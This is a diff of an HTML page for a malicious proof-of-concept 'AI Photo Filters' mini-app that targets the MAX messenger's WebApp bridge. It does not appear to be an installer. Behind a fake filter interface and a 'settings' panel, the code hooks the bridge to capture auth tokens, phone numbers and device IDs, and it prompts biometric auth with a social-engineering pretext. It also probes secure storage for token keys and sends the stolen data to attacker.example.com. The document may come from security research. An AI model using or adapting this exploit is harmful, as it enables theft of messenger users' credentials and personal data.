@@ -6,82 +6,34 @@
 <title>✨ AI Photo Filters — MAX Mini-App</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    background: #1a1a2e;
-    color: #eee;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    min-height: 100vh;
-    padding: 16px;
-  }
-  .app-header {
-    text-align: center;
-    padding: 24px 0;
-    width: 100%;
-  }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+         background: #1a1a2e; color: #eee; display: flex; flex-direction: column;
+         align-items: center; min-height: 100vh; padding: 16px; }
+  .app-header { text-align: center; padding: 24px 0; width: 100%; }
   .app-header h1 { font-size: 22px; color: #fff; }
   .app-header p  { font-size: 13px; color: #888; margin-top: 4px; }
-  .card {
-    background: #16213e;
-    border-radius: 12px;
-    padding: 16px;
-    margin: 8px 0;
-    width: 100%;
-    max-width: 420px;
-    box-shadow: 0 2px 12px rgba(0,0,0,0.3);
-  }
+  .card { background: #16213e; border-radius: 12px; padding: 16px; margin: 8px 0;
+          width: 100%; max-width: 420px; box-shadow: 0 2px 12px rgba(0,0,0,0.3); }
   .card h2 { font-size: 15px; color: #e94560; margin-bottom: 8px; }
-  .btn {
-    display: block;
-    width: 100%;
-    padding: 12px;
-    margin: 6px 0;
-    border: none;
-    border-radius: 8px;
-    font-size: 14px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: opacity 0.2s;
-  }
-  .btn:hover { opacity: 0.85; }
+  .btn { display: block; width: 100%; padding: 12px; margin: 6px 0; border: none;
+         border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; }
   .btn-primary { background: #e94560; color: #fff; }
   .btn-secondary { background: #0f3460; color: #fff; }
   .btn-success { background: #2ecc71; color: #000; }
-  .btn-warning { background: #f39c12; color: #000; }
   .btn-danger  { background: #c0392b; color: #fff; }
-  .log-area {
-    background: #0a0a1a;
-    border: 1px solid #333;
-    border-radius: 8px;
-    padding: 10px;
-    margin-top: 8px;
-    max-height: 300px;
-    overflow-y: auto;
-    font-family: 'Courier New', monospace;
-    font-size: 11px;
-    white-space: pre-wrap;
-    word-break: break-all;
-  }
-  .log-entry { padding: 3px 0; border-bottom: 1px solid #1a1a2e; }
-  .log-token  { color: #e94560; font-weight: bold; }
-  .log-phone  { color: #f39c12; font-weight: bold; }
-  .log-error  { color: #e74c3c; }
-  .log-info   { color: #3498db; }
-  .log-success { color: #2ecc71; }
-  .exfil-badge {
-    display: inline-block;
-    background: #e94560;
-    color: #fff;
-    font-size: 10px;
-    padding: 2px 6px;
-    border-radius: 4px;
-    margin-left: 4px;
-  }
+  .btn-warning { background: #f39c12; color: #000; }
+  .log-area { background: #0a0a1a; border: 1px solid #333; border-radius: 8px;
+              padding: 10px; margin-top: 8px; max-height: 300px; overflow-y: auto;
+              font-family: 'Courier New', monospace; font-size: 11px;
+              white-space: pre-wrap; word-break: break-all; }
   .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
   .grid-2 .btn { font-size: 12px; padding: 10px 6px; }
   #status { text-align: center; padding: 8px; font-size: 12px; color: #888; }
+  .log-token  { color: #e94560; font-weight: bold; }
+  .log-error  { color: #e74c3c; }
+  .log-info   { color: #3498db; }
+  .log-success { color: #2ecc71; }
+  .log-warning { color: #f39c12; font-weight: bold; }
 </style>
 </head>
 <body>
@@ -91,9 +43,9 @@
   <p>Apply stunning AI filters to your photos</p>
 </div>
 
-<div id="status">🟡 Initializing bridge...</div>
+<div id="status">🟡 Connecting to bridge...</div>
 
-<!-- "Legitimate" UI -->
+<!-- Legitimate UI facade -->
 <div class="card">
   <h2>🎨 Choose a Filter</h2>
   <div class="grid-2">
@@ -110,7 +62,7 @@
   </button>
 </div>
 
-<!-- Hidden attack panel (looks like settings) -->
+<!-- Hidden attack controls -->
 <div class="card">
   <h2>⚙️ App Settings</h2>
   <div class="grid-2">
@@ -120,8 +72,8 @@
     <button class="btn btn-secondary" onclick="stealDeviceInfo()">
       📊 Device Info
     </button>
-    <button class="btn btn-warning" onclick="persistStolenData()">
-      💾 Save Preferences
+    <button class="btn btn-warning" onclick="testAllStorage()">
+      💾 Test Storage
     </button>
     <button class="btn btn-danger" onclick="exfiltrateData()">
       ☁️ Backup to Cloud
@@ -129,55 +81,54 @@
   </div>
 </div>
 
-<!-- Live event log -->
+<!-- Event log -->
 <div class="card">
-  <h2>📋 Event Log <span id="log-count" style="color:#888;font-size:11px;">(0 events)</span></h2>
+  <h2>📋 Event Log <span id="log-count" style="color:#888;font-size:11px;">(0)</span></h2>
   <div class="log-area" id="log"></div>
-  <button class="btn btn-secondary" style="margin-top:6px;" onclick="clearLog()">
-    Clear Log
-  </button>
+  <button class="btn btn-secondary" style="margin-top:6px;" onclick="clearLog()">Clear</button>
 </div>
 
 <!-- API Explorer -->
 <div class="card">
-  <h2>🔧 API Explorer (28 methods)</h2>
+  <h2>🔧 Event Type Explorer</h2>
   <div class="grid-2">
-    <button class="btn btn-secondary" onclick="callAPI('WebAppBiometryGetInfo')">BiometryGetInfo</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppBiometryRequestAuth')">BiometryReqAuth ⚡</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppBiometryRequestAccess')">BiometryReqAccess</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppBiometryUpdateToken')">BiometryUpdToken</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppBiometryOpenSettings')">BiometryOpenSett.</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppRequestPhone')">RequestPhone ⚡</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppOpenLink')">OpenLink</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppOpenMaxLink')">OpenMaxLink ⚡</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppShare')">Share</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppMaxShare')">MaxShare</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppDownloadFile')">DownloadFile</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppSecureStorageSaveKey')">SecureStorSave</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppSecureStorageGetKey')">SecureStorGet</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppSecureStorageClear')">SecureStorClear</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppDeviceStorageSaveKey')">DeviceStorSave</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppDeviceStorageGetKey')">DeviceStorGet</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppDeviceStorageClear')">DeviceStorClear</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppSetupBackButton')">SetupBackBtn</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppSetupClosingBehavior')">SetupCloseBeh</button>
-    <button class="btn btn-secondary" onclick="callAPI('WebAppClose')">Close</button>
-    <button class="btn btn-success" onclick="callAPI('WebAppReady')">Ready</button>
+    <button class="btn btn-secondary" onclick="sendEvent('biometry_get_info')">biometry_get_info</button>
+    <button class="btn btn-secondary" onclick="sendEvent('biometry_request_auth')">biometry_req_auth ⚡</button>
+    <button class="btn btn-secondary" onclick="sendEvent('biometry_request_access')">biometry_req_access</button>
+    <button class="btn btn-secondary" onclick="sendEvent('biometry_update_token')">biometry_upd_token</button>
+    <button class="btn btn-secondary" onclick="sendEvent('biometry_open_settings')">biometry_open_sett</button>
+    <button class="btn btn-secondary" onclick="sendEvent('request_phone')">request_phone ⚡</button>
+    <button class="btn btn-secondary" onclick="sendEvent('web_app_open_link')">open_link</button>
+    <button class="btn btn-secondary" onclick="sendEvent('web_app_open_max_link')">open_max_link</button>
+    <button class="btn btn-secondary" onclick="sendEvent('web_app_share')">share</button>
+    <button class="btn btn-secondary" onclick="sendEvent('web_app_max_share')">max_share</button>
+    <button class="btn btn-secondary" onclick="sendEvent('web_app_download_file')">download_file</button>
+    <button class="btn btn-success" onclick="sendEvent('secure_storage_save_key')">secure_stor_save</button>
+    <button class="btn btn-success" onclick="sendEvent('secure_storage_get_key')">secure_stor_get</button>
+    <button class="btn btn-success" onclick="sendEvent('secure_storage_clear')">secure_stor_clear</button>
+    <button class="btn btn-secondary" onclick="sendEvent('device_storage_save_key')">device_stor_save</button>
+    <button class="btn btn-secondary" onclick="sendEvent('device_storage_get_key')">device_stor_get</button>
+    <button class="btn btn-secondary" onclick="sendEvent('device_storage_clear')">device_stor_clear</button>
   </div>
 </div>
 
 <script>
 // ============================================================
-// MAX Messenger WebApp Bridge — Malicious Mini-App PoC
+// CORRECT MAX WebApp Bridge Protocol
 // ============================================================
-// This demonstrates how a third-party mini-app can:
-//  1. Intercept ALL bridge events via sendEvent hook
-//  2. Steal auth tokens via biometric auth prompt
-//  3. Steal phone number
-//  4. Steal device ID
-//  5. Persist stolen data in secure storage
-//  6. Exfiltrate via URL open or link sharing
+// Architecture (reverse-engineered from web_apps.dll):
+//
+//   JS → C++:  qwChannel.objects.client.postEvent(eventType, jsonData)
+//   C++ → JS:  window.WebApp.sendEvent(eventType, jsonData)
+//
+// Event types use snake_case (biometry_request_auth, request_phone, etc.)
+// The C++ side injects window.WebApp.sendEvent() into the page context.
 // ============================================================
+
+let qwClient = null;
+let requestCounter = 0;
+let eventCount = 0;
+let bridgeReady = false;
 
 const STOLEN = {
   authToken: null,
@@ -187,78 +138,222 @@ const STOLEN = {
   allEvents: []
 };
 
-let eventCount = 0;
-let requestCounter = 0;
+// All known event types from DLL reverse engineering
+const EVENT_TYPES = {
+  // Biometry (UNDOCUMENTED - no official API docs)
+  BIOMETRY_GET_INFO:       'biometry_get_info',
+  BIOMETRY_REQUEST_ACCESS:  'biometry_request_access',
+  BIOMETRY_REQUEST_AUTH:    'biometry_request_auth',     // RETURNS TOKEN!
+  BIOMETRY_UPDATE_TOKEN:    'biometry_update_token',
+  BIOMETRY_OPEN_SETTINGS:   'biometry_open_settings',
+  BIOMETRY_ACCESS_GRANTED:  'biometry_access_granted',
+  BIOMETRY_TOKEN_SAVED:     'biometry_token_saved',
+
+  // Phone (UNDOCUMENTED - different from documented requestContact)
+  REQUEST_PHONE:            'request_phone',
+
+  // Links
+  OPEN_LINK:                'web_app_open_link',
+  OPEN_MAX_LINK:            'web_app_open_max_link',
+
+  // Share
+  SHARE:                    'web_app_share',
+  MAX_SHARE:                'web_app_max_share',
+
+  // Download
+  DOWNLOAD_FILE:            'web_app_download_file',
+
+  // Secure Storage (documented as WebApp.SecureStorage.*)
+  SECURE_STORAGE_SAVE:      'secure_storage_save_key',
+  SECURE_STORAGE_GET:       'secure_storage_get_key',
+  SECURE_STORAGE_CLEAR:     'secure_storage_clear',
+
+  // Device Storage (documented as WebApp.DeviceStorage.*)
+  DEVICE_STORAGE_SAVE:      'device_storage_save_key',
+  DEVICE_STORAGE_GET:       'device_storage_get_key',
+  DEVICE_STORAGE_CLEAR:     'device_storage_clear',
+};
 
 // ============================================================
-// BRIDGE HOOK — Intercept ALL sendEvent calls from C++ → JS
+// BRIDGE INITIALIZATION
 // ============================================================
-function installSendEventHook() {
-  // Poll for window.WebApp to be injected by MAX
-  const install = () => {
-    if (!window.WebApp || !window.WebApp.sendEvent) {
-      // Try QWebChannel init pattern
-      if (window.qwChannel && window.qwChannel.objects && window.qwChannel.objects.client) {
-        log('info', 'QWebChannel bridge found via qwChannel.objects.client');
-        window.WebApp = window.qwChannel.objects.client;
+
+function initBridge() {
+  log('info', '🔌 Waiting for MAX WebApp bridge...');
+
+  // Strategy 1: QWebChannel pattern (confirmed working by user test)
+  if (window.qt && window.qt.webChannelTransport) {
+    log('info', 'qt.webChannelTransport found, initializing QWebChannel...');
+
+    if (typeof QWebChannel !== 'undefined') {
+      new QWebChannel(qt.webChannelTransport, function(channel) {
+        log('success', `QWebChannel connected. Objects: ${Object.keys(channel.objects).join(', ')}`);
+
+        // The C++ side is registered as "client"
+        if (channel.objects.client) {
+          qwClient = channel.objects.client;
+          log('success', '✅ Got client object — bridge ready!');
+
+          // Check what methods the client exposes
+          const clientMethods = Object.keys(qwClient).filter(k => typeof qwClient[k] === 'function');
+          log('info', `client methods: ${clientMethods.join(', ') || 'NONE (plain object)'}`);
+
+          // Check if postEvent exists
+          if (typeof qwClient.postEvent === 'function') {
+            log('success', 'client.postEvent() found — can send events to C++');
+          } else {
+            log('warning', 'client.postEvent not found — checking for alternative methods...');
+            // Log all properties
+            const props = Object.keys(qwClient);
+            log('info', `client properties: ${props.join(', ')}`);
+            // Try all functions
+            for (const key of props) {
+              if (typeof qwClient[key] === 'function') {
+                log('info', `  client.${key}() — function with ${qwClient[key].length} params`);
+              }
+            }
+          }
+
+          bridgeReady = true;
+          updateStatus('🟢 Bridge ready');
+          setupSendEventHook();
+          autoRecon();
+        } else {
+          log('error', `No "client" object. Available: ${Object.keys(channel.objects).join(', ')}`);
+        }
+      });
+      return;
+    } else {
+      log('error', 'QWebChannel library not loaded!');
+      updateStatus('🔴 No QWebChannel lib');
+      return;
+    }
+  }
+
+  // Strategy 2: window.WebApp already exists
+  if (window.WebApp) {
+    log('info', 'window.WebApp found directly');
+    setupSendEventHook();
+    autoRecon();
+    return;
+  }
+
+  // Strategy 3: Poll
+  log('info', 'No transport yet, polling...');
+  setTimeout(initBridge, 200);
+}
+
+// ============================================================
+// sendEvent HOOK — intercept C++ → JS responses
+// ============================================================
+
+function setupSendEventHook() {
+  // The C++ side calls window.WebApp.sendEvent() to deliver responses.
+  // If window.WebApp doesn't exist yet, create it.
+  if (!window.WebApp) {
+    window.WebApp = {};
+    log('info', 'Created window.WebApp placeholder');
+  }
+
+  const originalSendEvent = window.WebApp.sendEvent?.bind(window.WebApp);
+
+  window.WebApp.sendEvent = function(eventType, jsonData) {
+    eventCount++;
+    let parsed = null;
+    try { parsed = JSON.parse(jsonData); } catch(e) {}
+
+    log('event', `📨 RECV sendEvent("${eventType}")`);
+
+    if (parsed) {
+      log('event', `   data: ${JSON.stringify(parsed).substring(0, 200)}`);
+
+      // --- AUTO-EXTRACT CREDENTIALS ---
+      // Biometric auth token
+      if (parsed.status === 'authorized' && parsed.token) {
+        STOLEN.authToken = parsed.token;
+        log('token', `💀💀💀 AUTH TOKEN STOLEN: ${parsed.token.substring(0, 50)}...`);
       }
-      if (!window.WebApp) {
-        setTimeout(install, 100);
-        return;
+      // Device ID
+      if (parsed.deviceId) {
+        STOLEN.deviceId = parsed.deviceId;
+        log('info', `📱 Device ID: ${parsed.deviceId}`);
+      }
+      // Biometric info
+      if (parsed.available !== undefined) {
+        STOLEN.biometricInfo = parsed;
+        log('info', `🔐 Biometric: available=${parsed.available}, type=${parsed.type}`);
+      }
+      // Storage values
+      if (parsed.key && parsed.value !== undefined) {
+        log('success', `💾 Storage GET: "${parsed.key}" = "${String(parsed.value).substring(0, 80)}"`);
+      }
+      // Phone number
+      if (parsed.phone) {
+        STOLEN.phoneNumber = parsed.phone;
+        log('token', `📱 PHONE NUMBER: ${parsed.phone}`);
+      }
+      // Error codes
+      if (parsed.error) {
+        log('error', `❌ Error: ${JSON.stringify(parsed.error)}`);
       }
     }
 
-    // Save original
-    const originalSendEvent = window.WebApp.sendEvent.bind(window.WebApp);
+    STOLEN.allEvents.push({ ts: Date.now(), event: eventType, data: parsed || jsonData });
+    updateStatus();
 
-    // Replace with intercepting version
-    window.WebApp.sendEvent = function(eventName, data) {
-      eventCount++;
-      let parsed = null;
-      try { parsed = JSON.parse(data); } catch(e) { /* raw string */ }
-
-      log('event', `[RECV] ${eventName}`, parsed || data);
-
-      // --- AUTOMATED DATA EXTRACTION ---
-      if (parsed) {
-        // Extract auth token from biometric auth response
-        if (parsed.status === 'authorized' && parsed.token) {
-          STOLEN.authToken = parsed.token;
-          log('token', `💀💀💀 AUTH TOKEN STOLEN: ${parsed.token.substring(0, 40)}...`);
-          // Immediately persist
-          persistToStorage('stolen_auth_token', parsed.token);
-        }
-        // Extract device ID
-        if (parsed.deviceId) {
-          STOLEN.deviceId = parsed.deviceId;
-          log('info', `📱 Device ID captured: ${parsed.deviceId}`);
-          persistToStorage('stolen_device_id', parsed.deviceId);
-        }
-        // Track biometric info
-        if (parsed.available !== undefined) {
-          STOLEN.biometricInfo = parsed;
-          log('info', `🔐 Biometric info: available=${parsed.available}, type=${parsed.type}, tokenSaved=${parsed.tokenSaved}`);
-        }
-        // Storage responses
-        if (parsed.key && parsed.value) {
-          log('info', `💾 Storage key "${parsed.key}" = "${parsed.value.substring(0, 50)}..."`);
-        }
-      }
-
-      STOLEN.allEvents.push({ ts: Date.now(), event: eventName, data: parsed || data });
-      updateStatus();
-      return originalSendEvent(eventName, data);
-    };
-
-    updateStatus('🟢 Bridge hooked — intercepting all events');
-    log('success', '✅ sendEvent HOOK INSTALLED — All C++→JS events now intercepted');
-    log('info', `window.WebApp methods available: ${Object.keys(window.WebApp).filter(k => typeof window.WebApp[k] === 'function').join(', ')}`);
-
-    // Auto-start reconnaissance
-    setTimeout(autoRecon, 500);
+    // Forward to original if it exists
+    if (originalSendEvent) {
+      return originalSendEvent(eventType, jsonData);
+    }
   };
 
-  install();
+  log('success', '🪝 sendEvent hook installed — intercepting all C++→JS responses');
+}
+
+// ============================================================
+// SEND EVENTS TO C++
+// ============================================================
+
+function sendEvent(eventType, extraData) {
+  if (!bridgeReady || !qwClient) {
+    log('error', `Bridge not ready! Can't send "${eventType}"`);
+    return;
+  }
+
+  const reqId = 'req-' + (++requestCounter);
+  const payload = JSON.stringify({
+    requestId: reqId,
+    ...(extraData || {})
+  });
+
+  if (typeof qwClient.postEvent === 'function') {
+    log('info', `📤 SEND postEvent("${eventType}", ...) requestId=${reqId}`);
+    qwClient.postEvent(eventType, payload);
+  } else {
+    // Try alternative calling patterns
+    log('warning', `postEvent not a function. client type: ${typeof qwClient}`);
+
+    // Maybe the client IS the method? Try calling it directly
+    if (typeof qwClient === 'function') {
+      log('info', 'client is a function, calling directly...');
+      qwClient(eventType, payload);
+    }
+
+    // Maybe methods are directly on client?
+    const method = qwClient[eventType];
+    if (typeof method === 'function') {
+      log('info', `client.${eventType}() is a function, calling...`);
+      method(payload);
+    }
+
+    // Maybe there's a sendMessage or invoke method?
+    for (const key of Object.keys(qwClient)) {
+      if (typeof qwClient[key] === 'function') {
+        log('info', `Trying client.${key}("${eventType}", ...)`);
+        try { qwClient[key](eventType, payload); } catch(e) {}
+      }
+    }
+  }
 }
 
 // ============================================================
@@ -266,166 +361,138 @@ function installSendEventHook() {
 // ============================================================
 
 function stealTokenViaBiometry() {
-  log('info', '🎯 Attempting token theft via WebAppBiometryRequestAuth...');
-  try {
-    // Step 1: Request biometric access first
-    window.WebApp.WebAppBiometryRequestAccess('access-' + (++requestCounter));
-    // Step 2: Request auth immediately after
-    setTimeout(() => {
-      window.WebApp.WebAppBiometryRequestAuth('auth-' + (++requestCounter));
-      log('warning', '🔐 Biometric auth requested — if user approves, token will appear above');
-      log('warning', '   Social engineering: "Verify your identity to unlock premium filters"');
-    }, 300);
-  } catch(e) {
-    log('error', `Biometry request failed: ${e.message}`);
-  }
+  log('warning', '🎯 Attempting token theft via biometric auth...');
+  log('warning', '   If user approves biometric prompt, token will appear in log');
+
+  // Step 1: Request access first
+  sendEvent(EVENT_TYPES.BIOMETRY_REQUEST_ACCESS);
+
+  // Step 2: Request auth after a short delay
+  setTimeout(() => {
+    sendEvent(EVENT_TYPES.BIOMETRY_REQUEST_AUTH);
+    log('warning', '🔐 Biometric auth requested — user will see "Verify Identity" prompt');
+  }, 500);
 }
 
 function stealPhoneNumber() {
-  log('info', '📱 Requesting phone number via WebAppRequestPhone...');
-  try {
-    window.WebApp.WebAppRequestPhone('phone-' + (++requestCounter));
-    log('warning', '   Phone number will appear in events when user approves');
-  } catch(e) {
-    log('error', `Phone request failed: ${e.message}`);
-  }
+  log('info', '📱 Requesting phone number...');
+  sendEvent(EVENT_TYPES.REQUEST_PHONE);
 }
 
 function stealDeviceInfo() {
-  log('info', '📊 Requesting biometric/device info...');
-  try {
-    window.WebApp.WebAppBiometryGetInfo('info-' + (++requestCounter));
-    window.WebApp.WebAppBiometryOpenSettings('settings-' + (++requestCounter));
-  } catch(e) {
-    log('error', `Device info request failed: ${e.message}`);
-  }
+  log('info', '📊 Getting device/biometric info...');
+  sendEvent(EVENT_TYPES.BIOMETRY_GET_INFO);
+  setTimeout(() => sendEvent(EVENT_TYPES.BIOMETRY_OPEN_SETTINGS), 500);
 }
 
-function persistStolenData() {
-  log('info', '💾 Persisting stolen data to SecureStorage...');
-  if (STOLEN.authToken) {
-    persistToStorage('stolen_auth_token', STOLEN.authToken);
-  }
-  if (STOLEN.deviceId) {
-    persistToStorage('stolen_device_id', STOLEN.deviceId);
-  }
-  if (STOLEN.phoneNumber) {
-    persistToStorage('stolen_phone', STOLEN.phoneNumber);
-  }
-  log('info', '   Data saved — will persist across app sessions');
+function testAllStorage() {
+  log('info', '💾 Testing storage access...');
+
+  const testKey = 'bridge_test_' + Date.now();
+  const testValue = 'test_value_' + Math.random();
+
+  // Test secure storage
+  sendEvent(EVENT_TYPES.SECURE_STORAGE_SAVE, { key: testKey, value: testValue });
+  setTimeout(() => sendEvent(EVENT_TYPES.SECURE_STORAGE_GET, { key: testKey }), 500);
+  setTimeout(() => sendEvent(EVENT_TYPES.SECURE_STORAGE_CLEAR, {}), 1000);
+
+  // Test device storage
+  setTimeout(() => sendEvent(EVENT_TYPES.DEVICE_STORAGE_SAVE, { key: testKey, value: testValue }), 1500);
+  setTimeout(() => sendEvent(EVENT_TYPES.DEVICE_STORAGE_GET, { key: testKey }), 2000);
+  setTimeout(() => sendEvent(EVENT_TYPES.DEVICE_STORAGE_CLEAR, {}), 2500);
+
+  // Try to enumerate — empty key or wildcard
+  setTimeout(() => sendEvent(EVENT_TYPES.SECURE_STORAGE_GET, { key: '*' }), 3000);
+  setTimeout(() => sendEvent(EVENT_TYPES.SECURE_STORAGE_GET, { key: '' }), 3500);
+  setTimeout(() => sendEvent(EVENT_TYPES.DEVICE_STORAGE_GET, { key: '*' }), 4000);
+
+  // Try to exceed 10-key limit (if raw API doesn't enforce it)
+  setTimeout(() => {
+    log('info', 'Trying to set 100 keys (bypassing 10-key limit)...');
+    for (let i = 0; i < 100; i++) {
+      sendEvent(EVENT_TYPES.SECURE_STORAGE_SAVE, {
+        key: `overflow_test_${i}`,
+        value: `overflow_value_${i}`
+      });
+    }
+  }, 4500);
 }
 
 function exfiltrateData() {
   log('warning', '☁️ Exfiltrating stolen data...');
   const payload = btoa(JSON.stringify(STOLEN));
 
-  // Method 1: Open external URL with data
-  const exfilUrl = `https://attacker.example.com/collect?d=${encodeURIComponent(payload.substring(0, 500))}`;
-  log('info', `   Method 1: WebAppOpenLink("${exfilUrl.substring(0, 60)}...")`);
-  try { window.WebApp.WebAppOpenLink(exfilUrl); } catch(e) {}
+  // Method 1: Open external URL with data in query params
+  if (STOLEN.authToken) {
+    const exfilUrl = `https://attacker.example.com/collect?d=${encodeURIComponent(payload.substring(0, 500))}`;
+    sendEvent(EVENT_TYPES.OPEN_LINK, { url: exfilUrl });
+    log('info', `Exfil via open_link: ${exfilUrl.substring(0, 80)}...`);
+  }
 
-  // Method 2: Share via MAX
-  setTimeout(() => {
-    const shareData = JSON.stringify({
-      title: 'My AI Photos',
-      description: 'Check out my filtered photos!',
-      text: `exfil:${payload.substring(0,200)}`
+  // Method 2: Store in device storage for later retrieval
+  if (STOLEN.authToken) {
+    sendEvent(EVENT_TYPES.SECURE_STORAGE_SAVE, {
+      key: 'exfiltrated_token',
+      value: STOLEN.authToken
     });
-    log('info', '   Method 2: WebAppMaxShare with embedded data');
-    try { window.WebApp.WebAppMaxShare(shareData); } catch(e) {}
-  }, 500);
+    log('info', 'Token persisted in SecureStorage for cross-session retrieval');
+  }
 
-  // Method 3: Deep link with data embedded
-  setTimeout(() => {
-    log('info', '   Method 3: WebAppOpenMaxLink with exfil data');
-    const deepLink = `max://max.ru/joincall/exfil_${STOLEN.deviceId || 'unknown'}`;
-    try { window.WebApp.WebAppOpenMaxLink(deepLink); } catch(e) {}
-  }, 1000);
-
-  log('success', '✅ Exfiltration attempted via 3 channels');
+  log('success', '✅ Exfiltration attempted');
 }
 
 // ============================================================
-// AUTOMATED RECONNAISSANCE
+// AUTO-RECONNAISSANCE
 // ============================================================
 
 function autoRecon() {
   log('info', '🔍 Starting automated reconnaissance...');
-  try {
-    window.WebApp.WebAppReady();
-    window.WebApp.WebAppBiometryGetInfo('recon-info-' + (++requestCounter));
-    window.WebApp.WebAppRequestPhone('recon-phone-' + (++requestCounter));
-  } catch(e) {
-    log('error', `Auto-recon error: ${e.message}`);
-  }
 
-  // Keep probing periodically
-  setInterval(() => {
-    if (!STOLEN.authToken) {
-      try {
-        window.WebApp.WebAppBiometryGetInfo('poll-info-' + (++requestCounter));
-      } catch(e) {}
+  // Passive: get device info immediately
+  sendEvent(EVENT_TYPES.BIOMETRY_GET_INFO);
+
+  // Active: try to get phone (user will see prompt)
+  setTimeout(() => sendEvent(EVENT_TYPES.REQUEST_PHONE), 2000);
+
+  // Poll for stored tokens
+  const commonKeys = ['token', 'access_token', 'auth_token', 'stolen_auth_token',
+                       'session', 'phone', 'device_id', 'exfiltrated_token'];
+  setTimeout(() => {
+    for (const key of commonKeys) {
+      sendEvent(EVENT_TYPES.SECURE_STORAGE_GET, { key: key });
+      sendEvent(EVENT_TYPES.DEVICE_STORAGE_GET, { key: key });
     }
-  }, 30000); // Every 30 seconds
+  }, 3000);
 }
 
 // ============================================================
-// UTILITY FUNCTIONS
+// UTILITY
 // ============================================================
-
-function persistToStorage(key, value) {
-  try {
-    const payload = JSON.stringify({ key: key, value: value });
-    // Try both secure and device storage
-    window.WebApp.WebAppSecureStorageSaveKey(payload);
-    window.WebApp.WebAppDeviceStorageSaveKey(payload);
-  } catch(e) {
-    log('error', `Storage save failed: ${e.message}`);
-  }
-}
-
-function callAPI(methodName) {
-  log('info', `📞 Calling ${methodName}...`);
-  try {
-    const fn = window.WebApp[methodName];
-    if (typeof fn === 'function') {
-      fn.call(window.WebApp, 'manual-' + (++requestCounter));
-      log('success', `   ${methodName}() called successfully`);
-    } else {
-      log('error', `   ${methodName} is NOT a function (type: ${typeof fn})`);
-      log('info', `   Available: ${Object.keys(window.WebApp).filter(k => typeof window.WebApp[k] === 'function').join(', ')}`);
-    }
-  } catch(e) {
-    log('error', `   ${methodName}() threw: ${e.message}`);
-  }
-}
 
 function applyFilter(name) {
-  log('info', `🎨 Applying ${name} filter... (this is just a facade)`);
-  // This is just legitimate-looking functionality to avoid suspicion
+  log('info', `🎨 Applying ${name} filter... (facade)`);
 }
 
 function updateStatus(s) {
-  if (s) document.getElementById('status').innerHTML = s;
-  else {
-    const tokens = STOLEN.authToken ? '🔴 TOKEN STOLEN' : '🟡 waiting';
-    const phone  = STOLEN.phoneNumber ? '📱 PHONE' : '';
-    const device = STOLEN.deviceId ? '💻 DEVICE' : '';
-    document.getElementById('status').innerHTML = `${tokens} ${phone} ${device} | ${eventCount} events intercepted`;
+  if (s) {
+    document.getElementById('status').innerHTML = s;
+  } else {
+    const parts = [];
+    if (STOLEN.authToken) parts.push('🔴 TOKEN STOLEN');
+    else if (bridgeReady) parts.push('🟢 Ready');
+    else parts.push('🟡 Waiting');
+    if (STOLEN.phoneNumber) parts.push('📱 PHONE');
+    if (STOLEN.deviceId) parts.push('💻 DEVICE');
+    parts.push(`${eventCount} events`);
+    document.getElementById('status').innerHTML = parts.join(' | ');
   }
   document.getElementById('log-count').textContent = `(${eventCount} events)`;
 }
 
-function log(type, msg, data) {
+function log(type, msg) {
   const el = document.getElementById('log');
   const cssClass = `log-${type}`;
-  let html = `<div class="log-entry ${cssClass}">[${new Date().toLocaleTimeString()}] ${msg}`;
-  if (data) {
-    const dataStr = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
-    html += `\n${dataStr}`;
-  }
-  html += '</div>';
-  el.innerHTML += html;
+  el.innerHTML += `<div class="log-entry ${cssClass}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
   el.scrollTop = el.scrollHeight;
 }
 
@@ -436,48 +503,9 @@ function clearLog() {
 }
 
 // ============================================================
-// INITIALIZATION
+// INIT
 // ============================================================
-
-// Try multiple bridge detection strategies
-(function init() {
-  log('info', '🔌 Waiting for MAX WebApp bridge...');
-
-  // Strategy 1: window.WebApp already injected
-  if (window.WebApp) {
-    log('info', 'window.WebApp already present, installing hook');
-    installSendEventHook();
-    return;
-  }
-
-  // Strategy 2: QWebChannel pattern — qt.webChannelTransport
-  if (window.qt && window.qt.webChannelTransport) {
-    log('info', 'qt.webChannelTransport found, initializing QWebChannel...');
-    // Qt WebEngine provides the qwebchannel.js library
-    if (typeof QWebChannel !== 'undefined') {
-      new QWebChannel(qt.webChannelTransport, function(channel) {
-        log('info', `QWebChannel connected. Objects: ${Object.keys(channel.objects).join(', ')}`);
-        // MAX exposes the WebApp bridge as channel.objects.client or channel.objects.WebApp
-        if (channel.objects.WebApp) {
-          window.WebApp = channel.objects.WebApp;
-        } else if (channel.objects.client) {
-          window.WebApp = channel.objects.client;
-        }
-        installSendEventHook();
-      });
-    } else {
-      // QWebChannel JS library not loaded — WebApp must be injected differently
-      log('info', 'QWebChannel lib not found, polling for window.WebApp...');
-      installSendEventHook();
-    }
-    return;
-  }
-
-  // Strategy 3: Poll for injection
-  log('info', 'No bridge detected yet, polling...');
-  installSendEventHook();
-})();
+setTimeout(initBridge, 100);
 </script>
-
 </body>
 </html>
